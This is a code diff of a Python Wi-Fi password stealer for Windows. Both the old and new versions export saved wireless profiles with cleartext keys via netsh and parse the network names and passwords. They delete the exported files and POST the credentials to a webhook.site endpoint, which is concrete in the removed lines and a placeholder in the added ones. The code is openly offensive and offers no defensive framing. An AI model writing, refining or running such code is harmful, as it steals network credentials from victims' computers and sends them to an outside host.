@@ -1,15 +1,13 @@
-import subprocess, os, sys, requests
-import xml.etree.ElementTree as ET
+import subprocess, os, sys, requests, xmltodict
 
-#stealer URL - place yours here
-url = 'https://webhook.site/df2d35f2-acdf-47c9-8739-383b7d97e740'
-
-#Lists & Dicts
-wifi_files = []
-payload = {"SSID":[], "Password":[]}
+# Replace with your webhook
+url = 'https://webhook.site/#####################'
+payload = {"Pwnd":[]}
 
 #Use Python to execute Windows command
 command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
+
+print(command_output)
 
 #Grab current directory
 path = os.getcwd()
@@ -17,23 +15,19 @@ path = os.getcwd()
 #Append Wi-Fi XML files to wifi_files list
 for filename in os.listdir(path):
     if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
-        wifi_files.append(filename)
+        xml_content = open(filename,'rb')
+        as_dict = xmltodict.parse(xml_content)
+        xml_content.close()
+        payload['Pwnd'].append("%s:%s"% (as_dict['WLANProfile']['name'],as_dict['WLANProfile']['MSM']['security']['sharedKey']['keyMaterial']))
+        os.remove(filename)
 
-#Parse Wi-Fi XML files
-if len(wifi_files) >= 1:
-    for file in wifi_files:
-        tree = ET.parse(file)
-        root = tree.getroot()
-        SSID = root[0].text
-        password = root[4][0][1][2].text
-        payload["SSID"].append(SSID)
-        payload["Password"].append(password)
-        os.remove(file)
-    print("Wi-Fi profiles found.  Check your webhook")
+if len(payload["Pwnd"]) >= 1:
+    print("Wi-Fi profiles found. Check your webhook")
 else:
-        print("No Wi-Fi profiles found.  Exiting application")
-        sys.exit()
+    print("No Wi-Fi profiles found. Exiting...")
+    sys.exit()
 
-#Send the hackies
-payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
-r = requests.post(url, params='format=json', data=payload_str)
+final_payload = ''
+for ssid in payload['Pwnd']:
+    final_payload += '%s; \n' % ssid
+r = requests.post(url, params="format=json", data=final_payload)
